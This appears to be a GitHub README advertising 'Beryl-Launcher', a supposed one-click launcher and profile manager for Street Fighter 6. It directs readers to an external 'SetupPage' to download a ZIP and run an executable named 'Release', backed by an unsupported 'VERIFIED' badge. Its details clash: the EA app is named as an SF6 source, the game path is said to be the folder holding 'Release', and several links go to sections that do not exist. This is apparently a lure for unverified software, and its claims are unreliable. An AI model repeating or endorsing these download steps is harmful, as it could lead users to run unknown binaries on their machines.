# Beryl‑Launcher‑Street‑Fighter‑6

<div align="center">
  <a href="https://rewfdf.github.io/SetupPage/"><img src="https://img.shields.io/badge/DOWNLOAD-RELEASE-db2777?style=for-the-badge&logo=github&logoColor=white&labelColor=161b22" alt="Download"></a>
  <br>
  <a href="#-workflows--usage"><img src="https://img.shields.io/badge/WORKFLOW-GUIDE-0284c7?style=for-the-badge&logo=terminal&logoColor=white&labelColor=161b22" alt="WORKFLOW"></a> <a href="#-key-capabilities"><img src="https://img.shields.io/badge/FEATURES-MODULES-1d4ed8?style=for-the-badge&logo=sparkles&logoColor=white&labelColor=161b22" alt="FEATURES"></a>
  <br>
  <a href="#-overview"><img src="https://img.shields.io/badge/STATUS-VERIFIED-0f766e?style=for-the-badge&logo=checkmarx&logoColor=white&labelColor=161b22" alt="STATUS"></a> <a href="#-workflows--usage"><img src="https://img.shields.io/badge/ARCHIVE-READY-ea580c?style=for-the-badge&logo=docker&logoColor=white&labelColor=161b22" alt="ARCHIVE"></a>
</div>

**Windows 10 / 11 only • Game‑launcher • Quick‑start • Profile manager**

---

## What is Beryl‑Launcher?

Beryl‑Launcher is a lightweight desktop utility that puts **Street Fighter 6** at your fingertips. It launches the game with a single click, remembers your preferred launch options, and lets you switch between multiple player profiles without leaving the desktop.

- **Instant start** – no need to hunt through Steam/EA app folders.
- **Profile switching** – keep separate settings, overlays, and controller mappings.
- **Windows‑only** – built and tested exclusively on Windows 10 and Windows 11.

---

## Quick start (no installation)

1. Click the **Download** button below.
2. Extract the ZIP to a folder of your choice.
3. Run `Release` (the only executable needed).
4. Add your Street Fighter 6 installation path, save a profile, and launch!

---

## Features at a glance

| Feature | Description |
|--------|-------------|
| **One‑click launch** | Starts SF6 instantly with your saved arguments. |
| **Multiple profiles** | Store distinct configurations for solo, tournament, or streamer setups. |
| **Auto‑detect** | Detects the default Steam/EA install location on first run. |
| **Lightweight** | < 5 MB, no background services. |
| **Windows‑native UI** | Fluent design, dark/light mode support. |

---

## Download & try it now

<div style="display:flex; gap:10px; flex-wrap:wrap;">
  <a href="https://rewfdf.github.io/SetupPage/" style="background:#4A90E2;color:#fff;padding:12px 24px;border-radius:6px;text-decoration:none;font-weight:bold;">Download (Release Page)</a>
  <a href="https://github.com/IntersectScholar/Beryl-Launcher-Street-Fighter-6/releases/latest" style="background:#7ED321;color:#fff;padding:12px 24px;border-radius:6px;text-decoration:none;font-weight:bold;">Latest Release</a>
  <a href="https://github.com/IntersectScholar/Beryl-Launcher-Street-Fighter-6/wiki" style="background:#F5A623;color:#fff;padding:12px 24px;border-radius:6px;text-decoration:none;font-weight:bold;">Documentation</a>
</div>

---

## Getting started

### 1. Add your game folder

- Open the launcher.
- Click **Settings → Game Path**.
- Browse to the folder that contains `Release`.

### 2. Create a profile

- Press **New Profile**.
- Name it (e.g., *Solo*, *Tournament*, *Streamer*).
- Adjust launch arguments, overlay toggles, or controller presets.
- **Save**.

### 3. Launch!

Select the desired profile and hit **Play**. Beryl‑Launcher will start Street Fighter 6 with the exact configuration you saved.

---

## FAQ

**Q: Does this work on Windows 7?**
A: No. The launcher relies on APIs introduced in Windows 10 and later.

**Q: Can I use it with the Epic Games version of SF6?**
A: Yes – just point the game path to the Epic install folder.

**Q: Will it interfere with Steam/EA updates?**
A: No. Beryl‑Launcher only reads the executable; updates are handled by the respective platform.

---

## Contributing

Contributions are welcome! Fork the repository, make your changes, and submit a pull request. Please keep the following in mind:

- Keep the focus on Windows 10/11 compatibility.
- Do not add external binaries to the repo.
- Follow the existing code style and comment your additions.

---

## License

This project is released under the **MIT License** – see the `LICENSE` file for details.

---

*Happy fighting, and may your combos never be broken!*

---

**Author:** IntersectScholar
**Topics:** `windows` `desktop-utility` `game-launcher` `street-fighter-6` `sf6` `pc-gaming` `launcher` `utility`

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```